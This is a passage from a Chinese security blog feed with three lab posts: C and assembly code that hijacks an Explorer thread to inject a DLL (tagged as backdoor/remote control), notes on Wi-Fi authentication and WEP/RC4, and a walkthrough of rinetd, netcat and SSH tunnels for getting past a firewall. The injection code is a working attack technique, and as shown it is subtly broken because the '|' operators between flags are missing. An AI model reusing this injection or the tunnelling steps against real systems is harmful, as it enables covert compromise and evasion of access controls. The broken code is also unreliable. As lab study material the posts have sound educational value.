class="line"><span class="meta">#<span class="keyword">define</span> MarkFilePath 0x12345678</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MarkLoadLibraryA 0xeeeeeeee</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    CONTEXT ThreadContext;</span><br><span class="line">    DWORD   dwProcessID, dwThreadID;</span><br><span class="line">    HANDLE hThread, hProcess;</span><br><span class="line">    DWORD dwCodeSize;</span><br><span class="line">    PVOID pRemoteCodeAddr, pFilePath;</span><br><span class="line">    DWORD dwBytesWritten;</span><br><span class="line">    PVOID pCode, pCodeText;</span><br><span class="line">    PVOID pFunc;</span><br><span class="line">    CHAR szDllDirectory[MAX_PATH];</span><br><span class="line">    <span class="built_in">EnDebugPrivilege</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//找到进程和线程</span></span><br><span class="line">    hwnd = <span class="built_in">FindWindow</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Shell_TrayWnd&quot;</span>), <span class="literal">NULL</span>);</span><br><span class="line">    dwThreadID = <span class="built_in">GetWindowThreadProcessId</span>(hwnd, &amp;dwProcessID);</span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION  PROCESS_VM_WRITE, FALSE, dwProcessID);</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_GET_CONTEXT  THREAD_SET_CONTEXT  THREAD_SUSPEND_RESUME, FALSE, dwThreadID);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess  <span class="literal">NULL</span> == hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">OutPutErrorMessage</span>(<span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 分配代码空间</span></span><br><span class="line">    dwCodeSize = (DWORD)NextFunc - (DWORD)MyFunc;</span><br><span class="line">    pRemoteCodeAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pRemoteCodeAddr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">OutPutErrorMessage</span>(<span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//分配参数szText空间,并写入</span></span><br><span class="line">    pFilePath = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">GetCurrentDirectory</span>(_countof(szDllDirectory), szDllDirectory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;\\&#x27;</span> == szDllDirectory[<span class="built_in">strlen</span>(szDllDirectory)])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcat_s</span>(szDllDirectory, _countof(szDllDirectory), <span class="string">&quot;Dll.dll&quot;</span>);</span><br><span class="line">        <span class="comment">//_tcscat_s(szDllDirectory, _countof(szDllDirectory), TEXT(&quot;Dll.dll&quot;));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcat_s</span>(szDllDirectory, _countof(szDllDirectory), <span class="string">&quot;\\Dll.dll&quot;</span>);</span><br><span class="line">        <span class="comment">//_tcscat_s(szDllDirectory, _countof(szDllDirectory), TEXT(&quot;\\Dll.dll&quot;));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, pFilePath, szDllDirectory, <span class="built_in">strlen</span>(szDllDirectory),</span><br><span class="line">        &amp;dwBytesWritten);</span><br><span class="line">    <span class="comment">//对注入的代码进行修改</span></span><br><span class="line">    pCode = (PBYTE)MyFunc;</span><br><span class="line">    <span class="comment">//参数</span></span><br><span class="line">    pCodeText = <span class="built_in">SearchAddr</span>(pCode, dwCodeSize, MarkFilePath);</span><br><span class="line"></span><br><span class="line">    *(DWORD*)pCodeText = (DWORD)pFilePath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改函数地址</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    pCodeText = <span class="built_in">SearchAddr</span>(pCode, dwCodeSize, MarkLoadLibraryA);</span><br><span class="line">    *(DWORD*)pCodeText = (DWORD)pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//挂起线程</span></span><br><span class="line">    <span class="built_in">SuspendThread</span>(hThread);</span><br><span class="line">    ThreadContext.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">    <span class="built_in">GetThreadContext</span>(hThread, &amp;ThreadContext);</span><br><span class="line">    <span class="comment">//EIP</span></span><br><span class="line">    pCodeText = <span class="built_in">SearchAddr</span>(pCode, dwCodeSize, MarkEIP);</span><br><span class="line">    *(DWORD*)pCodeText = ThreadContext.Eip;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteCodeAddr, pCode, dwCodeSize, &amp;dwBytesWritten);</span><br><span class="line">    ThreadContext.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">    ThreadContext.Eip = (DWORD)pRemoteCodeAddr;</span><br><span class="line">    <span class="built_in">SetThreadContext</span>(hThread, &amp;ThreadContext);</span><br><span class="line">    <span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注入的代码</span></span><br><span class="line"><span class="type">static</span> VOID __declspec(naked) <span class="built_in">MyFunc</span>()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        push MarkEIP    <span class="comment">//push eip, 只是示意,EIP不能push操作哦</span></span><br><span class="line">        pushad</span><br><span class="line">        pushfd</span><br><span class="line">        push MarkFilePath</span><br><span class="line">        mov eax, MarkLoadLibraryA</span><br><span class="line">        call eax</span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        ret    <span class="comment">//pop eip</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">NextFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">EnDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        LUID luid;</span><br><span class="line">        <span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid);</span><br><span class="line">        TOKEN_PRIVILEGES tp;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">        tp.Privileges-&gt;Luid = luid;</span><br><span class="line">        tp.Privileges-&gt;Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">        <span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">OutPutErrorMessage</span><span class="params">(DWORD dwMessageID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pErrorMessage;</span><br><span class="line">    <span class="built_in">FormatMessage</span>(</span><br><span class="line">        FORMAT_MESSAGE_ALLOCATE_BUFFER  FORMAT_MESSAGE_FROM_SYSTEM,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        dwMessageID,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        (LPTSTR)&amp;pErrorMessage,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, pErrorMessage, <span class="built_in">TEXT</span>(<span class="string">&quot;ERROR&quot;</span>), MB_OK  MB_ICONHAND);</span><br><span class="line">    <span class="built_in">LocalFree</span>(pErrorMessage);</span><br><span class="line">    <span class="keyword">return</span> dwMessageID;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PVOID <span class="title">SearchAddr</span><span class="params">(PVOID pStart, DWORD dwSize, DWORD dwAddrCodeMark)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD i = (DWORD)pStart;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; (DWORD)pStart + dwSize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断地址是否有效</span></span><br><span class="line">        <span class="comment">//已经搜索到</span></span><br><span class="line">        <span class="keyword">if</span> (*((DWORD*)i) == dwAddrCodeMark)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (PVOID)i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="示例测试">5. 示例测试</h2>
<h3 id="dll注入-2">1、Dll注入</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f86a09ca25f.png" /></p>
<h3 id="纯代码注入-2">2、纯代码注入</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f86a93812be.png" /></p>
<p>想了解更多的推荐：<a
href="https://www.1024sou.com/article/709955.html"></a><a
href="https://www.1024sou.com/article/709955.html">https://www.1024sou.com/article/709955.html</a></p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>远程控制</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title>无线通信过程</title>
    <url>/2022/04/16/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="连接到无线网络">1. 连接到无线网络</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416154945722-1932171389.png" /></p>
<h3 id="probe">1、Probe</h3>
<p>STA向 <strong>所有信道</strong> 发出probe帧，发现AP</p>
<p>AP回应Response</p>
<h3 id="authentication">2、Authentication</h3>
<p>STA向AP发出验证请求</p>
<p>发生认证过程(步骤可变，如加密算法的不同)</p>
<p>AP响应STA的认证结果</p>
<h3 id="association">3、Association</h3>
<p>STA发出关联请求</p>
<p>AP响应关联请求</p>
<p>关联成功，开始通信</p>
<h2 id="wep和wpa探测过程">2. WEP和WPA探测过程</h2>
<h3 id="beacon标识使用wepwpa加密">1、Beacon标识使用WEP/WPA加密</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416164012224-943793075.png" /></p>
<h3 id="sta发送普通probe帧">2、STA发送普通Probe帧</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416164457188-438240720.png" /></p>
<h3 id="ap响应probe-response帧声明其采用wepwpa加密">3、AP响应Probe
Response帧声明其采用WEP/WPA加密</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416164747057-172690945.png" /></p>
<p><strong>注意：</strong>
如果是WPA加密，则包头包含WPA1字段信息，如上图，另外不同厂商对802.11标准的实现方式不同，部分字段可能是厂商自己设的。</p>
<h2 id="wep-open认证过程">3. WEP OPEN认证过程</h2>
<p>WEP Open认证与open认证通信过程相同</p>
<p>正确认证后通信数据被WEP加密</p>
<p>如果认证时客户端输入错误密码</p>
<p><strong>认证依然可以通过</strong></p>
<p><strong>AP将丢弃该STA的数据包</strong></p>
<p><strong>起始向量被错误地密钥解密后完整性被破坏</strong></p>
<p><strong>但数据传输将失败</strong></p>
<p>认证响应正确，身份验证成功</p>
<p><strong>实例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416173120404-718479099.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416173225323-611078389.png" /></p>
<h2 id="wep-psk认证过程">4. WEP PSK认证过程</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416175250117-658255991.png" /></p>
<p><strong>STA发认证请求</strong></p>
<p><strong>AP返回随机Challenge消息</strong></p>
<p><strong>STA使用PSK加密Cha并发回给AP</strong></p>
<p><strong>AP使用PSK解密密文，获得Cha并与原始Cha比对，相同则验证成功，不同则验证失败；</strong></p>
<p><strong>注意：</strong></p>
<p><strong>认证过程中传输的是challenge
</strong>被共享密钥加密后的密文串** ，密钥并不会直接传输。**</p>
<p><strong>大部分的无线驱动先会尝试几次open认证，直到被AP多次拒绝后才会进行预共享密钥的认证。</strong></p>
<p><strong>实例：</strong></p>
<p>待补……</p>
<p><strong>无论使用什么加密架构，关联过程完全相同</strong></p>
<p>STA向AP发送关联请求</p>
<p>AP向STA发送关联成功或失败结果</p>
<p><strong>隐藏AP</strong></p>
<p><strong>STA关联包中必须包含目标AP的ESSID</strong></p>
<p><strong>嗅探到此关联包，说明有隐藏AP存在</strong></p>
<h2 id="无线加密">5. 无线加密</h2>
<p>无线安全根源</p>
<p>802.11基于无线电波发射信息</p>
<p>嗅探侦听是主要问题</p>
<p>加密机制是必须手段</p>
<p>Wired Equivalent Privacy (WEP)</p>
<p>802.11标准的一部分</p>
<p>发布后不久被发现存在安全漏洞</p>
<p>Wi-Fi Protected Access (WPA) 取代WEP</p>
<p>WPA2 (802.11i标准)</p>
<h3 id="open无加密网络">1、OPEN无加密网络</h3>
<p>无任何加密机制</p>
<p><strong>所有数据都可以被嗅探</strong></p>
<p>STA和AP只协商拼配参数即可连入网络</p>
<p><strong>实例：</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417094301730-114497668.png" /></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417094539959-501255070.png" /></p>
<p><strong>截获的user/passwd</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417093130041-1934384022.png" /></p>
<h3 id="wep-加密系统">2、WEP 加密系统</h3>
<p><strong>使用Rivest Cipher 4
(RC4)算法加密流量内容，实现机密性</strong></p>
<p><strong>CRC32算法检查数据完整性</strong></p>
<p><strong>标准采用使用24位initialization vector (IV)</strong></p>
<p>受美国加密技术出口限制法律的要求</p>
<ul>
<li>高于64bit key禁止出口</li>
<li>所以除24bit IV之外真实的key只有40bit的版本被允许出口</li>
<li>出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)</li>
</ul>
<h4 id="rc4算法">（1）RC4算法</h4>
<p>RSA实验室研发的对称加密流算法</p>
<ul>
<li>实现简单</li>
<li>速度快</li>
</ul>
<p>加密:对明文流和密钥流进行XOR计算</p>
<p>解密:对密文流和密钥流进行XOR计算</p>
<p><strong>RC4算法key由两个过程生成</strong></p>
<ul>
<li>合并IV和SKA，利用Key Scheduling Algorithm
(KSA)算法生成起始状态表</li>
<li>Pseudo- Random Generation Algorithm
(PRGA)算法生成最终密钥流（使密钥流长度与加密数据流长度一致）</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417113846776-768867710.png" /></p>
<h4 id="rc4算法加密流程">（2）RC4算法加密流程</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417113912847-398234971.png" /></p>
<p><strong>备注：</strong>
IV初始向量（24位），ICV（32位）是明文通过CRC32算法计算生成的完整性校验值；另外，数据加密主要使用两种密钥，DefaultKey和MappingKey。数据加密密钥一般使用默认密钥中Key
ID为0的Default Key密钥。也就是说，所有的用户使用相同的密钥。</p>
<h4 id="rc4算法解密流程">（3）RC4算法解密流程</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220417113943932-1177299759.png" /></p>
<h3 id="wpa安全系统"><a
href="https://www.cnblogs.com/z9m8r8/articles/16155362.html">3、WPA安全系统</a></h3>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>流量操控技术</title>
    <url>/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="流量操控技术">1. 流量操控技术</h2>
<ul>
<li>Traffic manipulation technique</li>
<li>渗透测试中经常遇到访问受限的网络环境</li>
<li>使用隐蔽的手段逃避安全检查措施和溯源追踪【加密+代理】</li>
<li>证明看似严格的访问控制仍然存在弱点</li>
<li>在非受信任的网络中实现安全的数据传输</li>
<li>部分概念的实现过程略有烧脑</li>
</ul>
<h3 id="重定向-redirection">1、重定向 （Redirection）</h3>
<ul>
<li>IP、Port【明文传递，不安全】</li>
</ul>
<h3 id="隧道-tunneling">2、隧道 （Tunneling）</h3>
<ul>
<li>在不受信任的网络环境中实现安全的通信</li>
<li>通常使用多种加密技术建立通信隧道</li>
<li>点到点（IP2IP）、端到端（Port2Port，更安全）隧道</li>
<li>VPN：pptp、l2tp、IPSec、SSL vpn</li>
</ul>
<h3 id="封装-encapsulation">3、封装 （encapsulation）</h3>
<ul>
<li>通常结合在隧道中使用，使用一种协议封装一种协议 （RPC over
http、VoIP）</li>
<li>使用网关设备实现不同类型的互联互通</li>
</ul>
<h2 id="重定向实操">2. 重定向实操</h2>
<h3 id="环境部署">1、环境部署</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315224647324-1804309036.png" /></p>
<ul>
<li>XP：内网机</li>
<li>monowall：防火墙</li>
<li>kali：代理中转</li>
<li>win2008：目标机</li>
</ul>
<h4 id="monowall-安装及配置">（1）monowall 安装及配置</h4>
<ul>
<li>iso：<a
href="http://sourceforge.net/projects/archiveos/files/m/monowall/generic-pc-1.8.1.iso/download"
class="uri">http://sourceforge.net/projects/archiveos/files/m/monowall/generic-pc-1.8.1.iso/download</a></li>
<li>注意，新建虚拟机，选择FreeBSD和更早的版本。</li>
<li><strong>配置</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315225551934-2134057897.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315225645124-1419318762.gif" /></p>
<h4 id="xp及monowall-规则配置">（2）XP及monowall 规则配置</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315225859516-553778834.png" /></p>
<p>注，将VM的虚拟网络编辑器的DHCP服务关掉，否则XP地址是VM的DHCP分配的，我们要让monowall给XP分配IP地址</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315230317120-468266088.gif" /></p>
<p>注，规则生效前是可以正常访问外网的（如百度），生效后刷新百度就没反应了。</p>
<h4 id="kali-配置nat">（3）Kali 配置【NAT】</h4>
<ul>
<li>IP：192.168.159.129</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install  rinetd </span><br><span class="line">vim /etc/rinetd.conf</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315231149875-1947128160.png" /></p>
<ul>
<li>配置完启动</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315231325772-1623373245.png" /></p>
<h4 id="win2008-搭建测试环境nat">（4）win2008 搭建测试环境【NAT】</h4>
<ul>
<li>IP：192.168.159.134，phpstudy安装略……</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315231458602-2112159479.png" /></p>
<h4 id="xp测试突破上网">（5）XP测试【突破上网】</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315231801152-1556892010.png" /></p>
<h3 id="重定向至win2008的远程桌面">2、重定向至win2008的远程桌面</h3>
<ul>
<li>Kali 改 rinetd 的配置，并重启。</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230315233231333-251152280.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316100141750-875771632.gif" /></p>
<h3 id="nc-重定向获取-shell">3、NC 重定向获取 shell</h3>
<ul>
<li>下载：<a href="https://eternallybored.org/misc/netcat/"
class="uri">https://eternallybored.org/misc/netcat/</a></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316104019013-754903330.gif" /></p>
<p><strong>注</strong> ，nc中转连接不了的话，可以重启 kali 试试</p>
<h2 id="ssh-隧道">3. SSH 隧道</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316112255571-554627747.png" /></p>
<ul>
<li><strong>SSH 支持双向通信隧道</strong></li>
<li>将其他 TCP 端口的通信通过 SSH 链接来转发</li>
<li>用 SSH 作为传输协议，对流量自动加解密</li>
<li>突破防火墙访问规则的限制，可用于翻墙</li>
<li><strong>SSH 本地端口转发</strong></li>
<li>使效果类似于 rinetd，rinetd
的监听端口在防火墙之外，ssh的监听在本地</li>
<li>将一 <strong>本地端口</strong> 与远程服务器建立隧道</li>
<li><strong>建立双向安全隧道</strong></li>
<li>将其他 TCP 端口的通信通过 SSH 链接来转发</li>
<li>用 SSH 作为传输协议，对流量自动加解密</li>
<li>突破防火墙访问规则的限制，可用于翻墙</li>
</ul>
<h3 id="本地端口转发"><strong>1</strong>
<strong>、本地端口转发</strong></h3>
<ul>
<li>本机侦听端口，访问转发到远程主机指定端口</li>
<li>SSH 客户端+应用客户端位于 FW 一端</li>
<li>SSH 服务器+应用服务器位于另一端</li>
<li>端口转发基于家里起来的 SSH 隧道，隧道中断端口转发中断</li>
<li>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</li>
</ul>
<h3 id="远程端口转发"><strong>2、远程端口转发</strong></h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230317121808973-411774577.png" /></p>
<ul>
<li>远程侦听端口，访问转发到本机主机指定端口</li>
<li>由于 ACL 等原因，SSH 与应用连接建立方向相反</li>
<li>SSH 客户端、应用客户端位于 FW 两端</li>
<li>SSH 服务器、应用服务器位于 FW 两端</li>
<li><strong>ssh -fCNg -R :: user@ -p</strong></li>
<li>之所以成为远程，是因为 SSH 侦听端口开在远程【外网】的 SSH Server
上</li>
<li>侦听端口永远在客户端一方</li>
<li>听起来有点绕，可以结合后面的实操理解</li>
</ul>
<h3 id="动态隧道模式"><strong>3、动态隧道模式</strong></h3>
<ul>
<li><strong>本地、远程端口转发都需要固定应用服务器IP、Port</strong></li>
<li>应用端口繁多，逐个转发效率低</li>
<li>某些应用不固定端口</li>
<li>某些网站不支持IP直接访问</li>
<li>使用非受信网络上网时保护流量不被嗅探</li>
<li>本地侦听 socks4/5 代理端口</li>
<li>由 SSH server 决定如何转发</li>
<li>作为翻墙代理使用</li>
<li>配置客户端代理（浏览器）</li>
<li>使用 proxychains 支持无代理客户端</li>
<li><strong>ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316221545683-1547919404.png" /></p>
<h3 id="x协议转发">4、X协议转发</h3>
<ul>
<li><strong>远程登陆 Linux GUI 运行图形化界面工具</strong></li>
<li>VNC</li>
<li>X windows</li>
<li><strong>防火墙限制访问时</strong></li>
<li>基于 SSH 的 X 转发</li>
<li>ssh -X user@1.1.1.1 -p 53</li>
<li><strong>也就是说基于X协议的转发可以用图形化界面操作目标机【理解见实操】</strong></li>
</ul>
<h2 id="ssh-本地端口转发实操">4. SSH 本地端口转发实操</h2>
<h3 id="环境部署-1">1、环境部署</h3>
<h4 id="基本概述">（1）基本概述</h4>
<ul>
<li>防火墙还是前面搭建的monowall，仅允许访问外网53端口。内网机由kali-2.0，xp充当，外网机由Kali-2022，win2008充当。</li>
<li>通过kali-2.0与Kali-2022建立ssh隧道，监听端口设在Ubuntu【本地转发】，通过访问Ubuntu的监听端口访问kali及win2008的web服务，远程桌面等</li>
<li>monowall【仅主机模式+NAT模式】:10.1.1.1</li>
<li>kali-2.0【仅主机模式】:10.1.1.2</li>
<li>xp【仅主机模式】:10.1.1.4</li>
<li>kali-2022【NAT模式】:192.168.159.129</li>
<li>win2008【NAT模式】:192.168.159.134</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316205605757-1027798732.png" /></p>
<h4 id="kali-2022-配置">（2）kali-2022 配置</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config  <span class="comment">#编辑该文件，作以下修改</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span>   <span class="comment">#默认情况下是禁止以root登录的</span></span><br><span class="line">Port 53               <span class="comment">#monowall仅允许访问53端口</span></span><br><span class="line">PasswordAuthentication <span class="built_in">yes</span>   <span class="comment">#开启登录认证</span></span><br><span class="line">systemctl  restart ssh.service  <span class="comment">#重启ssh</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316195854144-888079336.png" /></p>
<ul>
<li><strong>用kali-2.0测试下</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316200048773-50501378.png" /></p>
<h3 id="访问-win2008">2、访问 win2008</h3>
<ul>
<li><strong>命令：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>-f：后台运行进程</p></li>
<li><p>-N：不执行登录
shell（不显示登录的界面，即远程kali-2022的shell）</p></li>
<li><p>-C：进行压缩，节省带宽</p></li>
<li><p>-g：复用访问时作为网关，支持多主机访问本地侦听端口</p></li>
<li><p>listen port：kali-2.0上的监听端口</p></li>
<li><p>remote
ip/port：最终要访问的地址【此处即为win2008ip/port】</p></li>
<li><p><strong>示例【</strong> <strong>kali-2.0 命令】</strong></p></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -fCNg -L  4001:192.168.159.134:80 root@192.168.159.129 -p 53</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>效果：</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316204143377-1810698387.png" /></p>
<ul>
<li><strong>注</strong>
，加-g参数后，该隧道支持内网区中的其他PC（如xp）等也可通过访问10.1.1.2:4001【kali-2.0】而访问外网win2008。</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230316213157245-1345762985.png" /></p>
<h3 id="访问kali-2022的web特殊">3、访问kali-2022的web【特殊】</h3>
<ul>
<li><strong>命令：</strong></li>
</ul>
